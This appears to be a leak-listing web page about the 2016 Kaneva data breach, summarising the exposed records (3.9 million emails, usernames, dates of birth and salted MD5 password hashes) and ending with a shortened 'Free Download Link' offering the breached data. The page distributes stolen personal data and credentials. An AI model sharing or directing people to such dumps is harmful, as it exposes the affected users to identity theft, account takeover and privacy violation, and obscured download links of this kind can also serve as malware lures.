# Kaneva database leak

## Description

2016-07-01

In July 2016, now defunct website Kaneva, the service to &quot;build and explore virtual worlds&quot;, suffered a data breach that exposed 3.9M user records. The data included email addresses, usernames, dates of birth and salted MD5 password hashes.

## Breached data

Dates of birth, Email addresses, Passwords, Usernames

## Free download Link

[Kaneva breach Free Download Link](https://tinyurl.com/2b2k277t)